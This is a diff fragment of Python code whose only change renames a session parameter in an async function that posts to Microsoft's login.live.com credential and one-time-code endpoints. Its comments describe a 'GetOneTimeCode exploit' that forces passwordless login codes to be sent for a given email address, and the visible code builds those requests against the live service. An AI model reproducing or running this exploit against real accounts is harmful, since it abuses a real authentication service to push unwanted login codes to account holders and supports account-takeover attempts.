@@ -7,10 +7,10 @@ import httpx
 rom = logging.getLogger(__name__)
 
 
-async def send_auth(session: httpx.AsyncClient, email: str, proof: str = None) -> dict | None:
+async def send_auth(sesja: httpx.AsyncClient, email: str, proof: str = None) -> dict | None:
     # GetCredential no longer forces OTPs
     # Uses a GetOneTimeCode exploit to force it
-    send_auth = await session.post(
+    send_auth = await sesja.post(
         url="https://login.live.com/GetCredentialType.srf",
         headers={
             "Accept": "application/json",
@@ -84,7 +84,7 @@ async def send_auth(session: httpx.AsyncClient, email: str, proof: str = None) -
             altemaile = email_info["Credentials"]["OtcLoginEligibleProofs"][0]["data"]
 
             # Get the login PPFT
-            live = await livedata(session)
+            live = await livedata(sesja)
             flowtoken = live["ppft"]
 
             # Two tipes of OTPs
@@ -109,7 +109,7 @@ async def send_auth(session: httpx.AsyncClient, email: str, proof: str = None) -
                 print(f"[~] - Switched OTP Type")
                 payload["purpose"] = "eOTT_NoPasswordAccountLoginCode"
 
-            gotc = await session.post(
+            gotc = await sesja.post(
                 url="https://login.live.com/GetOneTimeCode.srf?id=38936",
                 headers={
                     "Accept": "application/json",
